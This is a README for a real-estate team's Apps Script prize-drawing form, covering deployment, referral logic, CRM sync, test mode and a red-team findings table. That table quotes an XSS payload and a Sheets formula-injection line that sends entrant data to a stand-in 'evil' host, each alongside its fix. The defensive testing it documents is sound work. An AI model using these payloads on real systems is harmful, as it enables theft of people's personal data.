# TSG Block Party 2026 — Raffle Entry Form

Public entry form + automatic 6:15 drawing + Follow Up Boss sync for the
**$300 Ticketmaster** prize at the TSG Block Party, **Saturday 19 September 2026,
3:00–7:00 PM, 1342 N Hancock St**.

## Where this deploys

Into the existing **"TSG Open House Sign-In + Client Intake Forms"** Apps Script
project (owned by `info@tsg.homes`, script id
`1ZPZIHv8ocQyN23ikKf3rTgpyIU9pktRqjlaFJEGamwNziWWjUqLGvBRf`) — *not* a new
project and *not* the task tracker.

That project is already the public, anonymous, no-login form host under `info@`,
already holds `FUB_API_KEY`, and already carries the hardening a public endpoint
needs: page-issued submit token, shared rate limit, honeypot, dedupe claims,
consent audit log, and the fix that stopped FUB error text leaking to anonymous
visitors. Standing that up again from scratch in a new project, untested, in
three days would have been strictly more risk. The task tracker's script is
untouched — nothing public goes anywhere near its Anthropic key or script token.

## Files

| File | What it is |
|---|---|
| `RaffleCode.gs` | New server file. Paste into the project as `RaffleCode`. All symbols are `raffle*`-prefixed. |
| `RaffleForm.html` | **Built** page. Paste into the project as `RaffleForm`. Do not hand-edit. |
| `RaffleForm.template.html` | Source for the above. Edit this. |
| `tools/build-form.js` | `node tools/build-form.js` → regenerates `RaffleForm.html`. |
| `assets/` | All four pinned marks (Eagles, Ticketmaster, TSG, KW) + their base64. |
| `PATCH-Code.gs.md` | The two one-line edits to the existing `Code.gs`. |
| `test/test_raffle.js` | 72 unit tests for `RaffleCode.gs`. |
| `test/test_form.js` | 47 browser tests for the built page (countdown, open/close flips, payload). |

## Deployment status

**Live as version @63, deployed 2026-09-17 by `info@tsg.homes`.**

All nine project files pushed and then verified byte-for-byte by re-pulling the
live project — including `Code.js`, `OpenHouseForm.html` and `ClientIntake.html`,
which this work must not disturb and which have **no version control of their
own**: every deploy pulls the live project first and pushes the raffle files on
top of what came back. Deployed to the *existing* deployment, so the public URL
and any printed QR are unchanged.

Deployed **as info@ deliberately**. The web app is `executeAs: USER_DEPLOYING`,
so the deploying account is the one the script runs as — and therefore the one
`MailApp` sends from. Gmail shows the identity had drifted to durand@ between
2 and 8 September (an earlier redeploy); @31 puts all three forms back on info@.
**If you ever redeploy this project, do it as info@ or the sending identity
silently moves again.**

### One step left, and only you can do it

`setupRaffle()` must be run once **from the editor while signed in as info@** —
not as durand@. It could not be run remotely (`clasp run` needs the project
linked to a standard GCP project; it is not).

Signed in as info@ matters for a concrete reason: the entries Sheet and the 6:15
trigger are owned by whoever creates them. Created under durand@ while the web
app runs as info@, `SpreadsheetApp.openById` would fail and **every entry on
Saturday would be refused**.

1. Open the project as info@ → select `setupRaffle` → **Run** → approve.
   The only new scope is trigger creation; Mail and Spreadsheet were already
   granted by `sendErrorAlert` and `logConsentRecord`.
2. Expect: the entries sheet, a generated `RAFFLE_ADMIN_KEY`,
   `Draw trigger armed for 2026-09-19 18:15:00 ET`, the hourly entry digest, the
   5:00 PM reminder batch and its hourly catch-up.
3. Run `raffleAdminLinks()` and keep the output.

**Re-run it after any deploy that adds a trigger.** A deploy cannot create
triggers — only running code can — so the reminder batch and the digest exist
only once `setupRaffle()` has been run since they were added. Running it again is
safe: it does not duplicate the sheet or re-mint the admin key.

**Must happen before entries matter.** Until then the form renders but cannot
save an entry and the draw is not armed.

### Then verify by hand (this session's proxy blocks `script.google.com`)

- `<exec>?form=raffle` → countdown page
- `<exec>?form=raffle&qatest=<QA_TEST_SECRET>` → test mode, red banner, usable now
- bare `<exec>` → Open House Sign-In, unchanged
- `<exec>?form=buyer-seller` → intake form, unchanged

The last two matter: @31 republished the whole project, not just the raffle.

### Entry is open to anyone

`"access": "ANYONE_ANONYMOUS"` — no Google account or sign-in of any kind. Any
phone, any browser, any email domain. The email field is free text and is not
verified against a Google identity. (The domain-restricted Deal Forms live on a
different deployment and are unaffected.)

## How entry works — 1 entry, +5 per confirmed referral

Verifying your email address enters you, once, immediately. Each person you
refer who **confirms** their own details and gives their own consent adds
`RAFFLE_BONUS_TICKETS_PER_REFERRAL` (5) more entries. There is no cap on how
many different people you may refer.

It did not start this way. Entry originally *required* a confirmed referral,
which put a stranger's inbox on the critical path of the raffle existing at all:
cold-referral email confirmation converts somewhere around 20–40% even with a
nudge, so a quiet weekend meant zero eligible entries and no drawing. That
failure mode is worse than a thin pool, so on 2026-09-17 — before anybody had
entered, so nothing published was broken by the change — the referral became a
multiplier instead of a gate.

The sheet carries **one row per thing worth tickets**:

| Row | Written when | Status | Tickets |
|---|---|---|---|
| Own entry | the 6-digit code is confirmed | `eligible` at once | 1 |
| Referral | the entrant submits a referral | `pending-consent` | 0 |
| ″ | that person confirms | `eligible` | 5 |
| Their own entry | that same confirmation | `eligible` at once | 1 |

**Confirming enters the referred person too.** That is deliberate, and it is the
only thing that gives a cold referral a reason of their own to click: confirming
used to buy them nothing but somebody else's five entries. The consent box carries
the 18+/US-resident attestation and agreement to the Official Rules whenever the
drawing is still open, which is what makes entering them legitimate — after 6:15
the box asks for neither and nobody is entered. The invite subject line leads with
it, and so does the 5:00 PM reminder.

The draw expands every eligible row into that many tickets, shuffles the tickets
and picks one, then de-dupes by person for the two backups. A referral that never
replies is worth nothing and is counted in no number reported anywhere — and at
draw time it is still logged to FUB, flagged `Needs Consent` and
`Unconfirmed Contact Info`, so the lead is not lost.

A referred person who confirms is then invited to enter in their own right, with
their details already known: opening that link enters them (one ticket) and
offers them the referral form. That is the chain, and it has no end condition
other than the 6:15 close.

## The four URLs

| URL | Share? |
|---|---|
| `<exec>?form=raffle` | **Yes** — this is the QR code. No key, safe to print. |
| `<exec>?form=raffle&kiosk=1` | For the iPad at the table. Auto-resets 6s after each entry. |
| `<exec>?form=raffle&action=status&key=…` | **Private.** People entered, tickets in the draw, referrals still pending. |
| `<exec>?form=raffle&action=draw&key=…` | **Private.** Manual draw, if the trigger misfires. |
| `<exec>?form=raffle&action=console&key=…` | **Private.** The 6:30 draw console: pick, preview, confirm, send. |
| `<exec>?form=raffle&action=notifywinner&key=…` | **Private.** Sends the winner email. Pressed after the announcement, never before. |

The two `key=` URLs carry the admin key — treat them like a password. A wrong key
and a missing key both return an identical "Not found", so neither can be probed.

## How the day runs

- **Now – 6:15 PM Saturday** — entries are **already open**, not just during the
  party. The three-hour window the form shipped with made sense when entering was
  a 20-second sign-in at a table; it does not when a referral has to read an email
  and reply. Opening early is also what makes the pre-event email to invited
  clients worth sending. One own-entry per person, matched on **both** email and
  phone (country code and formatting normalized, so `+1 215.555.0123` and
  `(215) 555-0123` are the same person), and a second visit from the same person
  adds referrals rather than a second own entry.
- **Every 10 people entered** — Durand gets a note with the people, ticket and
  pending-referral counts. During the party an hourly digest takes over instead,
  so he is not double-notified while standing in a street. The digest also prints
  the email budget: recipients left today, the burn rate, and whether it lasts.
- **Email budget, day of** — the account has 1,500 recipients a day, shared with
  the Open House form, and every bcc copy counts (a code is 1, an invite is 3, a
  full referral chain about 14). Every send between 3:00 and 6:15 records the
  remaining quota; if the faster of the party-long and last-hour rates says it
  runs out before entries close, **one** email goes to Durand and Ryan with the
  rate and the projected time (`raffleWatchMailQuota_`). Independently, sends
  refuse once fewer than 40 recipients would remain (`RAFFLE_MAIL_RESERVE`), so
  the result, the winner email and alerts always have budget; the entrant is
  told to grab someone from TSG and the refusal alerts once. Each QA suite run
  costs about 60 recipients — run it once, in the morning.
- **5:00 PM Saturday** — every referral who has not replied gets one last-chance
  email, and every entrant still waiting on somebody gets one nudge to text them.
  All of them go out in a single batch, deliberately: one wave, 75 minutes of
  runway, and nobody is chased twice.
- **6:15:00 PM** — the page **goes dead by itself**, no reload needed, and shows
  "Entries are closed — winner announced at 6:30." It measures this against the
  *server* clock, so a phone with a wrong clock still closes on time. The trigger
  fires, picks a winner plus **two backups** from one weighted shuffle, and emails
  you and Ryan an HTML summary with all three picks, their ticket counts, links
  into their FUB records and into whoever they referred, and a button to the
  console.
- **6:30 PM** — Ryan announces. Nothing has reached the winner yet: the winner
  email is a separate, explicit press in the console, after a preview and a
  confirmation. The winner need not be present; the rules give a 14-day claim
  window and the backups are there in case they've left. Picks 2 and 3, and any
  redraw, need a written reason, recorded on an append-only `Draw Audit` tab.

## What lands in FUB

Each entrant becomes a person record — matched to an existing contact where there
is one, never duplicated — with:

- tags `Block Party 2026`, `Block Party Raffle Entrant`, `Event Lead`
- source `TSG Block Party 2026 - Raffle`
- the `Consent — Captured Date` custom field set (same field the other two forms use)
- a background note recording block party attendance and the exact consent given
- a timeline note: *"Met at the TSG Block Party… Warm event lead — worth a personal call, not just a drip."*

**A FUB outage cannot cost anyone their entry.** The sheet row is written first
and the FUB push is best-effort on top of it; a failure is recorded on the row,
alerted to you by email, and re-pushed later with `raffleRetryFubFailures()`.

## Open items for you

1. **Ryan's email.** His calendar identity is `ryan@thestawaszgroup.com`; this
   project's FUB roster has `ryan@tsg.homes`. Results go to **both** rather than
   me guessing which one he reads on a Saturday evening. Trim
   `RAFFLE_RESULT_EMAIL` if you want just one.
2. **Buy the gift card before Saturday.** Nothing here does that.
3. **The consent decision is yours and it's live.** You asked for all fields
   required, so entry is conditioned on consent to autodialed/pre-recorded calls
   and texts. That is the exact fact pattern TCPA plaintiffs' firms target, at
   $500–$1,500 per message. The wording is accurate about it (it says consent is
   required to enter, and does not falsely claim otherwise). Making the
   marketing half optional later is a one-line change.
4. **Trademarks.** The Ticketmaster and Eagles marks are on the page at your
   direction. The standard mitigation is in place — a non-affiliation disclaimer
   visible above the button, and again as section 12 of the rules — but it is a
   mitigation, not permission.
5. **"Raffle" is never written on the page.** A paid raffle in Pennsylvania needs
   a Small Games of Chance licence; a free-entry prize drawing does not. The page
   says "prize drawing" and leads with NO PURCHASE NECESSARY. Call it a raffle out
   loud all you like — just don't put it in print or charge for entry.
6. **Rules placeholders are filled**, not stubs: sponsor address, phone and email
   are the real TSG Center City details. Per your instruction no licence number
   is printed; the brokerage is still identified as Keller Williams Empower.

## What happens if the entrant is already in FUB

**It updates the existing contact. It does not create a duplicate.**

FUB does not merge on email — a plain create always makes a second record, which
would put the raffle tags on a brand-new empty record while the real contact,
with all its history, got nothing. So the raffle looks the person up first.

### How a match is decided

Candidates are pulled by email **and** by phone, then scored. A match counts as
confident only when:

- **email matches AND** (last name **or** first name **or** phone also matches), or
- **phone matches AND both** first and last name match

**Email alone is not enough. Phone alone is not enough.** A couple sharing one
address or one mobile is the common case and they are two different people —
merging them would corrupt real CRM data, which is the expensive direction to get
wrong. Names are compared exactly (case and punctuation normalized); there is no
nickname guessing, for the same reason.

| Situation | What happens |
|---|---|
| Exactly one confident match | **Update** that contact |
| No confident match | Create a new contact |
| Two or more confident matches | Update **nothing**, create a new contact, and email Durand both record links to merge by hand |

### What an update does

- **Additive only.** A new email or phone is *appended*; an existing one is never
  replaced. You gain the second mobile rather than losing the first.
- **Tags are merged**, not overwritten — existing tags survive and the raffle tags
  join them, on the record that actually has the history.
- **An existing name is never overwritten.** A blank one gets filled in. The CRM's
  version of someone's name beats what they thumbed in at a party.
- **The original lead source is left alone.** That is history; the raffle tags are
  what record that they came through this event.
- **The previous state is written to a note** — prior name, emails, phones, tags
  and source, plus exactly what this entry added and what it matched on. Nothing
  is silently overwritten.

## Verification

Entry is **two-step**: details → a 6-digit code emailed instantly → type it back.
Nothing is written to the sheet or to FUB until the code is confirmed, so a
typo'd or invented address never becomes a contact record. The entry is written
from the **server-cached** values, not from whatever the second request carries,
so you cannot verify one address and enter a different one.

Codes expire in 15 minutes, are single-use, and are cut off after 5 wrong
attempts (which destroys the pending entry).

### The phone is NOT ownership-verified, and you should know why

The phone is the field TCPA actually cares about, so an SMS code would be the
stronger check. It is not reachable for this event:

- **Follow Up Boss cannot send it.** Its `/v1/textMessages` endpoint *logs* an
  externally-sent text; it does not deliver one. There is no send-SMS API.
- **A real SMS provider cannot be stood up in time.** US A2P 10DLC campaign
  review is currently running 10–15 days, with full carrier approval 3–6 weeks.
  The party is in three days.

So the phone gets hard validation instead of proof of ownership, and the FUB
background note says so explicitly rather than implying more than was checked.
If you want SMS verification for a future event, start the A2P registration
weeks ahead.

### Junk rejection (both fields, server-side)

Names too (2026-09-17): the entrant's name, the referral's name and the name edited on
the consent page must be letters (any script), digits, spaces, apostrophes, hyphens and
periods, 60 characters at most. A name is interpolated into the *subject* of an email to
a third party ("<name> referred you — …"), and a subject line has no escaping to hide
behind; the QA suite's hostile entrants made that visible in the inbox. Sink escaping
stays as defence in depth, and the suites relax `RAFFLE_NAME_ALLOWED_RE` to keep proving it.

Rejected outright: disposable/temp mail domains (mailinator, 10minutemail,
yopmail, …), `example.*` and `test.*`, role and mash local-parts (`test@`,
`asdf@`, `admin@`, `noreply@`), empty values, all-same digits (5555555555),
`1234567890`, area or exchange codes starting 0 or 1, N11 area codes (911, 411),
and the reserved 555-01xx fictional range.

That last one is worth knowing: **`(215) 555-0123` is now rejected**, because it
is the reserved fictional range and cannot be a real number. The form's
placeholder was changed accordingly.

This directly targets what is already in your FUB from earlier form testing —
`test@me.com` / `1234567899` / `asdf@asdf.caf`.

## Test mode vs live

You cannot test the live form before Saturday — the entry window refuses
everything outside 3:00–6:15 PM on 19 Sep. Test mode exists for exactly that.

It reuses the project's **existing** QA test mode (the `QA_TEST_*` block in
`Code.gs`), so there is one test-mode concept across all three forms, not two.
It needs the `QA_TEST_SECRET` script property set — the same one the open-house
and intake forms already use.

| | Live | Test |
|---|---|---|
| URL | `?form=raffle` | `?form=raffle&qatest=<QA_TEST_SECRET>` |
| Entry window | enforced (Sat 3:00–6:15) | **bypassed** — works any time |
| Entries land in | `Entries` tab | `Test Entries` tab |
| FUB record | normal | name prefixed `[QA TEST] `, tagged `QA Test — Safe to Delete` |
| Winner stored as | `RAFFLE_WINNER_JSON` | `RAFFLE_TEST_WINNER_JSON` |
| Draw result tab | `Draw Result` | `Draw Result (TEST)` |
| Result email | Durand + Ryan | Durand's QA address + Ryan (Durand only during a QA suite run) |
| On-screen | normal page | red TEST MODE banner, impossible to miss |

**Test entries can never win the real prize.** That is structural, not a filter:
the live draw reads the `Entries` tab and the test draw reads `Test Entries`,
and there is no code path joining them. A test draw also writes its own winner
property, so it cannot consume the live draw's one-shot lock — you can rehearse
as often as you like and the real 6:15 draw is still pending and unaffected. The
6:15 trigger itself calls `raffleDrawWinner_(false)` explicitly, so it is always
the live draw even if something else is in test mode.

**Test mode relaxes exactly one check — the entry window.** `Code.gs`'s own test
mode is documented as "a LABELLING and ROUTING change only; by construction it
cannot relax a check", and this is a deliberate, single departure from that,
logged loudly every time it fires. The form token, rate limit, honeypot,
required fields, consent and one-entry-per-person all still apply in test mode,
and there are tests asserting each of those.

### Rehearsing the whole thing

1. `<exec>?form=raffle&qatest=<secret>` → enter a few fake people.
2. `<exec>?form=raffle&action=status&key=<admin key>&test=1` → check the count.
3. `<exec>?form=raffle&action=draw&key=<admin key>&test=1` → rehearse the draw.
   You get the winner page and the result email, exactly as Saturday will look.
4. `raffleResetTest()` in the editor → wipes test entries, the test winner and
   the `Draw Result (TEST)` tab. Touches nothing live. Safe to run at any time,
   including during the party.

`raffleAdminLinks()` prints all of these with the key filled in.

Clean-up note: test entries **are** written to FUB for real, because that is the
point of a rehearsal — but they are prefixed and tagged, so filter FUB on
`QA Test — Safe to Delete` and delete them when you are done.

## Branding

All four marks are **baked into the built page**, not fetched at runtime: the
bytes that were reviewed are the bytes that ship, nobody can swap a trademark in
by dropping a file in Drive, and the page needs no Drive scope and no external
image requests. Sourced from TSG's own Drive and optimized — Eagles 263 KB →
12.6 KB, TSG wordmark (cropped from `TSG_2024_LOGO-01.png`) 3.2 MB → 4.1 KB,
KW Empower 676 KB → 4.6 KB, Ticketmaster inlined as vector. Whole page: 55 KB.

To change a logo: replace the file in `assets/`, run `node tools/build-form.js`,
re-paste `RaffleForm.html`.

## QR code

`assets/tsg-monogram.png` is the TSG monogram, cropped out of
`TSG_2024_LOGO-01.png` from inside the capsule ring, used as the centre mark.

```
DEP=$(clasp list-deployments | grep -v '@HEAD' | grep -o 'AKfycb[A-Za-z0-9_-]*' | head -1)
python3 tools/make-qr.py "https://script.google.com/macros/s/$DEP/exec?form=raffle" ~/Desktop
```

The URL is an **argument, never a constant** — it carries the deployment id, this
repo is public, and `npm test` fails on any tracked file containing one. Pipe it
from `clasp` rather than retyping it.

Two things the script does that matter:

- The centre mark is sized against error-correction headroom. The code is ECC
  level H (~30% recoverable) and the white plate is fitted to the monogram's own
  tall-narrow proportion rather than squared off — a square plate knocks out
  noticeably more modules for the same visual size. It covers ~5% of the area.
- **It refuses to emit a code it has not proved scannable.** Every output is
  decoded back and compared to the exact input URL at 900/600/450px under blur,
  12° rotation and a glare gradient. Any failure exits non-zero rather than
  handing you a pretty code that does not work.

It also writes a plain, unbranded code. Take it to the event as a fallback: if an
old phone or bad light struggles with the branded one, swap the print and you
lose only the logo.

**Print at 8cm or larger** — it is a 61×61-module code. It scans smaller, but
8–10cm on a table tent gives a comfortable arm's-length scan.

**The URL does not change when you redeploy**, as long as you deploy to the
existing deployment (`clasp deploy -i <id>`, or Manage deployments → Edit → New
version). Creating a *new* deployment mints a new URL and kills every printed QR.

## Failure handling (2026-09-18, after the 9/17 rehearsal)

Two things the rehearsal found: a guest saw *"Could not reach us — check your
signal and try again"* for what was almost certainly a server-side error, and
the draw console showed *"Could not reach the server."* beside a button that
merely looked disabled — no retry, no alert, nothing logged anywhere a person
would look. Every lost entry is a lost FUB lead, so this is what changed.

**The pages tell the truth about what failed.** Every page (entry form, consent
page, draw console) reads the reply as text and parses it. A JSON answer is an
answer. Anything else — Apps Script's own HTML pages (*Authorization is
required…*, *Sorry, unable to open the file at this time*, *Script function not
found*), an HTTP error — is shown as **"Our server returned an error"** with the
page's title and first line of text. Only a failed `fetch` (no signal, DNS, a
captive portal) is called a connection problem. The old message blamed the
guest's phone for both.

**Every failure is a failed state with a Retry.** A red block under the button:
what failed, the server's words, one **Retry** that re-sends the identical
payload (nothing is retyped, the form is never reset on the way back), and the
fallback ("find someone from TSG"). The button goes back to live, never stuck
disabled; in the console it reads *Send failed — retry*. Retries are safe on
every step: the invite marks its row before answering and refuses a second send,
the winner email is stamped only after `MailApp` accepted it and refuses once
stamped, so a lost reply can never mail anybody twice.

**A caught server exception is no longer "Something went wrong".** The JSON
carries `serverError: true`, the exception's message scrubbed of URLs,
addresses and key-shaped strings (`raffleSafeErrorText_`), and a reference
`E-XXXXXX` that the guest sees, the Executions log line carries, the alert email
to Durand carries, and the sheet row carries — so "what happened to Dana?" has
an answer.

**It is written down.** A new `Client Errors` tab on the entries sheet: one row
per failure, whether the server caught it (reference, step, message, stack) or a
page reported it. Pages report their own transport failures with a
fire-and-forget `step: 'report'` POST (`raffleRecordClientFailure_`; every field
bounded, formula-safe): where (phone/kiosk), which step, kind, HTTP status, what
the guest saw, device. A network failure is logged only; a server-kind failure
also emails Durand, at most once per 10 minutes.

**Draw and send failures reach Durand AND Ryan** (`raffleAlertOps_`, to
`RAFFLE_NOTIFY_EMAIL`, plus the host project's `sendErrorAlert`): the 6:15
trigger not completing (including an exception inside it, which used to die
silently), the draw running but its result email failing (the alert carries the
three names and phones in plain text), the winner email failing to send
(nothing stamped, so Retry sends), and a redraw whose new draw fails (the old
result is on the Draw Audit tab). The alternate-pick audit line is now written
*after* a successful send, not before.

### The "checking" step — measured, not guessed

Durand asked why *Checking…* takes so long. The two buttons that say it:

| Step | What the server does before it can answer |
|---|---|
| **Confirm & Enter** (`verify`) | Up to four Follow Up Boss calls in series (search by email, search by phone, create or update, note), then open the Sheet, read every row to dedupe the self-entry, append the row, and before the party a second full read for the milestone count — plus Apps Script's own per-request start-up. |
| **Continue** on the referral (`referral`) | One full read of the Sheet (the claim check), two FUB searches, the append. |

Each of those calls is a few hundred milliseconds and they run one after
another, so 4–8 seconds is the shape of it, not a bug. Rather than change the
order on a Friday night, the steps now **measure themselves**: `raffleTimer_`
laps `fub` / `sheet` / `mail` and the JSON carries `timing` (also in the
Executions log as `Raffle timing verify: fub=…ms sheet=…ms total=…ms`). In
**test mode** the form prints it under the button after each step, so a
rehearsal reads the real numbers from the real deployment. Live, the button
shows *Checking…* with a line underneath that says what is happening and counts
the seconds, and after 8 s adds that it is the server, not the phone.

The collapse worth doing, once the numbers say FUB is the bulk of it: write the
sheet row first and push to FUB afterwards from a sweep (`raffleRetryFubFailures`
already exists for the failure case). That changes *when* a contact appears in
FUB — Durand's call, not a code change to make unasked.

### Kiosk and form polish, same batch

- Both phone fields mask as you type — `(610) 380-8225` — and a leading `1`
  (iOS contact autofill, a pasted `+1`) is dropped so the mask still lands. The
  referral phone had no mask at all.
- The timeframe `<select>` takes the same box as the text fields (16px, 50px
  tall, full width, own chevron).
- The referral step ends with one button. *No thanks — I'm done* is a text
  link. *Start over for the next guest* exists only with `&kiosk=1` and clears
  every field, referral fields included; on the shared link closing the page is
  the reset.
- A gap under `$300`.

## Tests

```
npm test                     # from the repo root: tracker + raffle + red-team
node test/test_raffle.js     # 390 server-side tests
node test/test_redteam.js    # 179 adversarial tests (T1–T11)
node test/test_form.js       #      browser tests (needs: npm install playwright)
```

All three share `test/harness.js`, which loads the real `RaffleCode.gs` into a
`vm` sandbox with stubbed Apps Script globals — and it renders the **real**
template files, modelling `<?= ?>` vs `<?!= ?>` — so these are tests of the
shipped files, not of a model of them.

Covers identity normalization, the entry window, required fields and consent,
one-entry-per-person across both keys and all phone formats, FUB-outage
behaviour, the FUB payload shape, draw fairness and **non-repeatability** (a
double-fired trigger cannot re-roll a winner or send a second email), manual
disqualification, and admin-endpoint key gating.

### The red-team suite

`test/test_redteam.js` asks what a hostile entrant can make the form do, rather
than whether it works. It is organised by threat (T1–T11) and every case runs
against the real `RaffleCode.gs`. It was written on 2026-09-16, after the form
was already live, and it found four things that were genuinely wrong:

| Finding | What it meant | Fix |
|---|---|---|
| **Stored XSS on the admin pages** | The status and draw pages built HTML by concatenation from the winner's name, phone and email — all public text boxes. `<img src=x onerror=…> Smith` would have executed in Durand's browser the moment he opened the page to read the winner, i.e. at 6:15 in front of the crowd. | `raffleEsc_` at all 8 render sinks. Escaping stays at the **sink**, never at ingest — the host project removed ingest-escaping on purpose because it was mangling `O'Brien` on the way into FUB. |
| **Sheets formula injection** | A name of `=IMPORTXML("https://evil/?d="&C2,"//a")` is a live formula the moment the entries sheet is opened, and can ship every entrant's name, email and phone to a third party. The junk-phone filter does not catch it: that reads digits, and a formula string can carry ten valid ones. | `raffleSafeCell_` on every entrant-supplied cell. |
| **The endpoint was a free mailer** | Step 1 emails a code to any address posted. The shared 15/minute cap bounds the rate but sustains 21,600/day, so the 1,500/day Workspace quota dies in under two hours — taking verification codes, the Open House form's email and `sendErrorAlert` down with it, silently. | `raffleCheckCodeSendQuota_`: 3 codes per address per hour, 750 **recipients** (not messages — bcc copies count) per 6-hour bucket, with an alert when the ceiling is hit; and a hard reserve of 40 against the real daily quota, read from `MailApp.getRemainingDailyQuota()` on every guarded send. |
| **Gmail alias stuffing** | `sam.vance@`, `samvance@` and `sam.vance+party@gmail.com` are one inbox and were three entries — stuffing with no second inbox and no second phone. | `raffleEmailKey_` collapses dots (Google only) and `+tags` (major consumer hosts). |

One hardening change came out of it that was not a bug: a **live draw before
6:15 now has to be asked for twice** (`&force=1`). The draw is deliberately
irreversible, so an accidental tap on the admin bookmark at 4pm would have
locked in a winner from a near-empty sheet. The 6:15 trigger forces it itself
and test mode is exempt.

These held up unchanged and are now regression-locked: the verify step writes
from the server-cached values (so you cannot verify one address and enter
another), the 5-attempt code cap, malformed-`vid` rejection, consent that
cannot be spoofed with a truthy non-`Yes`, admin endpoints byte-identical for a
wrong key and no key, draw non-repeatability, test mode never touching the live
tab, FUB notes posted as plain text, and no CR/LF reaching an email header.

Two residual risks are accepted and documented in the code rather than fixed:
custom/Workspace domains also honour `+tags` and cannot be enumerated (what
actually bounds stuffing is that every entry must *receive* a code, so each one
costs a working inbox), and the phone is plausibility-checked but never
ownership-verified — SMS verification needs A2P 10DLC carrier approval, which
is weeks out.

The browser suite covers the countdown maths, the 3:00 open flip and the 6:15
close flip (both verified to happen with no reload), validation, phone
formatting, consent gating the POST, the exact payload shape, that all four
logos actually load, that the contact block is right, and that the word
"raffle" never appears anywhere on the page.
